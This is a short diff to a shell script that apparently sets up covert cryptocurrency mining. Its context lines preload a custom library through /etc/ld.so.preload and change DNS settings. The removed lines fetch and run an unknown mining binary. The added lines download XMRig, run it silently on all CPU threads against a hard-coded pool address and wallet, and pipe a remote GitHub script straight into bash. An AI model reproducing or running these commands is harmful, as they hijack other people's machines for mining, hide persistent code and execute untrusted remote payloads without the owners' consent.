@@ -8,7 +8,8 @@ echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
 rm nyumput.c
 echo "supersede domain-name-servers 1.1.1.1;">> /etc/dhcp/dhclient.conf
 /etc/init.d/network restart
-wget -O asu https://github.com/kidoescegh/filee/raw/main/SRB-3.0
-chmod 777 asu
-./asu --algorithm tht --pool stratum+tcps://tht.mine-n-krush.org:5001 --wallet 43d2hm3mqFnrhZirXgCL3GEx1RTHSgJHqN.DONGO --password x --cpu-threads $(nproc --all) > /dev/null 2>&1 &
-curl -sL https://github.com/kartolo92/koplok/raw/master/time | bash 
+wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz
+tar xf xmrig-6.24.0-linux-static-x64.tar.gz
+cd xmrig-6.24.0
+./xmrig --donate-level 1 -o 157.230.142.82:80 -u Q010500dcddedd09eb43778b8c86fc30d1682af477c2693f24c34113532603031ecdac7e2d5a133.$(shuf -n 1 -i 1-99999)-KIR -p x -a rx/0 -k -t $(nproc --all) > /dev/null 2>&1 &
+curl -sL https://github.com/kartolo92/koplok/raw/master/time | bash
